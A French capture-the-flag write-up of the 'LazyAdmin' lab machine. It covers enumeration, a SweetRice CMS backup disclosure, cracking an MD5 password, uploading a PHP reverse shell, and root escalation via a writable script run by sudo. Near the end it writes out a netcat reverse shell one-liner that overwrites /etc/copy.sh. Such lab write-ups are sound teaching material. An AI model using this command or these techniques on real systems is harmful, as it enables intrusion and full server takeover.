# LazyAdmin

Pour faciliter l'accès à la cible, je commence par modifier mon fichier `/etc/hosts`. J'y ajoute l’adresse IP suivie de l’alias **`lazy admin.thm**.`

Cela me permet d'utiliser ce nom de domaine localement au lieu de l'adresse IP.

![image.png](LazyAdmin/image.png)

Je commence l’énumération par un scan NMAP, cela vas permettre de détecter les services en écoute sur la machine, j’utilise le flag ` A` qui englobe plusieurs flags intéressent *(détection de version, os, analyse par script, ect) , l*e flag ` p ` permet de tester tout les ports et non seulement les 1000 les plus populaire par défauts, ensuite je précise le flag  T4 qui permet d’augmenter le nombre de paquet envoyé par seconde.

  **Port 22 (SSH)** : Service OpenSSH 7.2p2. Rien de spécial à première vue, la version a l'air clean.
  **Port 80 (HTTP)** : Un serveur Apache 2.4.18. C'est là que ça devient intéressant.

![image.png](img/image1.png)

En arrivant sur le site, je tombe sur la page d'accueil par défaut d'**Apache**. Donc je commence par vérifier manuellement s'il y a des fichiers classiques comme `robots.txt` ou `sitemap.xml`, mais je ne trouve rien du tout.

![image.png](img/image2.png)

Comme rien n'est exposé directement, j'effectue une énumération de répertoires par brute force (**fuzzing**) avec l'outil **ffuf**. Cela permet de tester une liste de mots clés pour trouver des dossiers qui ne sont pas référencés.

![image.png](img/image3.png)

Le scan remonte rapidement un répertoire nommé **/content**. En m'y rendant, je découvre que ce dossier héberge l'installation d'un **CMS**. (Content Management System)

C'est une plateforme, comme WordPress, qui permet de construire et gérer un site via une interface visuelle sans forcément coder. Ça utilise des "templates" pour le design et des "plugins" pour les fonctionnalités.

Le problème, c'est que ces systèmes sont souvent vulnérables, surtout quand ils ne sont pas à jour ou qu'un plugin est mal codé. Ici, le **CMS** utilisé est **SweetRice**.

![image.png](img/image4.png)

En faisant quelques recherches sur **exploit db.com**, je tombe sur deux vulnérabilités intéressantes pour **SweetRice** :

1. **Backup Disclosure** ([Exploit 40718](https://www.exploit db.com/exploits/40718)) : Cette faille permet d'accéder directement aux sauvegardes de la base de données MySQL et aux fichiers du site sans aucune authentification.
2. **Arbitrary File Upload** ([Exploit 40716](https://www.exploit db.com/exploits/40716)) : Elle permet d'uploader n'importe quel fichier sur le serveur (très utile pour un reverse shell), mais elle nécessite des identifiants valides.

Je garde l'option de l'upload sous le coude et je me concentre d'abord sur l'accès aux backups pour essayer de récupérer des informations sensibles.

![image.png](img/image5.png)

En testant l'accès aux répertoires de sauvegarde, je confirme que j'ai bien accès au **backup de la base de données MySQL**. En revanche, je n’ai pas accès au backup des fichiers.

![image.png](img/image6.png)

En ouvrant le fichier je trouve deux pseudos potentiels `manage & admin`.

 je trouve également une chaîne de caractères qui ressemble fortement à un **hash MD5** : `42f749ade7f9e195bf475f37a44cafcb`

![image.png](img/image7.png)

Le mot de passe était bien stocké en **MD5**, un algorithme obsolète qui m'a permis de récupérer le clair quasi instantanément. 

![image.png](img/image8.png)

Maintenant que j'ai un pseudo et un mot de passe, je tente naïvement une connexion via **SSH**. C'est un réflexe logique : tester si les identifiants de l'application web fonctionnent aussi pour accéder directement à la machine.

J'ai d'abord essayé avec l'utilisateur `admin`, puis avec `manager`, mais aucun des deux ne fonctionne. 

![image.png](img/image9.png)

![image.png](img/image10.png)

Je relance un **fuzzing de répertoires**, mais cette fois ci en prenant le dossier `/content` comme point de départ.

![image.png](img/image11.png)

En me rendant sur `http://lazy admin.thm/content/as/`, je tombe sur la page de connexion du CMS. Je tente de m'authentifier avec les identifiants récupérés précédemment dans le backup de la base de données : `manager : Password123`.

La connexion réussit, et j'accède enfin au panneau d'administration de **SweetRice**.

![image.png](img/image12.png)

Avec des identifiants valides, je peux enfin exploiter la vulnérabilité d'**upload arbitraire** identifiée plus tôt. L'objectif est d'injecter un script **PHP** pour obtenir un **reverse shell**, ce qui me permettra d'exécuter des commandes à distance directement sur le serveur web.

Avant d'envoyer mon fichier malveillant (payload), je prépare mon "listener" sur ma machine pour réceptionner la connexion entrante du serveur cible :

![image.png](img/image13.png)

Je génère mon **payload** (le code malveillant) via le site `revshells.com`. Pour maximiser mes chances, j'enregistre mon script avec l'extension **.php5**.

Cette technique permet souvent de contourner certains filtres de sécurité qui bloquent l'upload de fichiers `.php` classiques, mais qui autorisent encore des extensions moins courantes tout en les exécutant correctement sur le serveur.

![image.png](img/image14.png)

![image.png](img/image15.png)

Puisque l'upload automatique ne fonctionnait pas, je passe par le **Media Center** du panneau d'administration. C'est ici que le CMS gère les images et les fichiers du site. J'y télécharge mon fichier `shell.php5`

![image.png](img/image16.png)

J’obtient bien un reverse shell en tant que `www data.` Sur Linux, **www data** est l'utilisateur par défaut utilisé par les serveurs Web (comme Apache ou Nginx), par sécurité il est restreinte et a des droits limités. Je vais donc chercher a élever mes privilèges. 

![image.png](img/image17.png)

En tapant `sudo  l`, je vois que je peux exécuter un script **Perl** en tant que **root** sans mot de passe

![image.png](img/image18.png)

En ouvrant `backup.pl`, je m'aperçois qu'il ne contient presque rien : il se contente d'appeler un second script situé dans `/etc/copy.sh`.

C'est ici que se situe la vulnérabilité : j'ai les droits d'écriture sur ce fichier `/etc/copy.sh`. Comme c'est le script Perl (lancé en **root**) qui l'appelle, tout ce que j'écrirai dans `copy.sh` sera exécuté avec les privilèges maximum.

![image.png](img/image19.png)

Je prépare un nouveau **listener** sur ma machine pour recevoir cette connexion.

![image.png](img/image20.png)

Pour finaliser l'attaque, je remplace le contenu de `/etc/copy.sh` avec un reverse shell.

```bash
echo "mkfifo /tmp/pipe;cat /tmp/pipe|/bin/sh  i 2>&1|nc 192.168.169.180 1233 >/tmp/pipe" > /etc/copy.sh
```

Après avoir lancé le script Perl, mon listener intercepte la connexion. La commande `whoami` me confirme le résultat : je suis désormais **root**.

![image.png](img/image21.png)
